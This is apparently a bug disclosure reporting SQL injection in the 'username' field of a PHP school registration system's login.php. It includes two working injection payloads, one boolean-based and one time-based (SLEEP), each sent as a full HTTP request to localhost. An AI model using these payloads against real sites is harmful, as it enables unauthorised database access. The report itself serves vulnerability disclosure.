# School Registration and Fee System v1.0 has SQL injection

BUG_Author:saintone98

Website source address:https://www.sourcecodester.com/php/10932/school-registration-and-fee-system.html

Vulnerability File: /bilal final/login.php

POST parameter 'username' exists SQL injection vulnerability

Payload1: username=1'+OR+NOT+1207%3D1206%23&password=2

```
POST /bilal%20final/login.php HTTP/1.1
Host: localhost
Content-Length: 44
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/bilal%20final/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=2vcgmn9u7h75h5jbjdi1d2e871
Connection: close

username=1'+OR+NOT+1207%3D1206%23&password=2
```

An error occurred in the sql statement

![image](https://github.com/saintone98/picture/blob/main/error.png)

Payload2: username=1'+AND+(SELECT+2+FROM+(SELECT(SLEEP(10)))a)--+b&password=2

```
POST /bilal%20final/login.php HTTP/1.1
Host: localhost
Content-Length: 67
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/bilal%20final/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=2vcgmn9u7h75h5jbjdi1d2e871
Connection: close

username=1'+AND+(SELECT+2+FROM+(SELECT(SLEEP(10)))a)--+b&password=2
```

The server's response time is 10 seconds

![image](https://github.com/saintone98/picture/blob/main/tenSec.png)

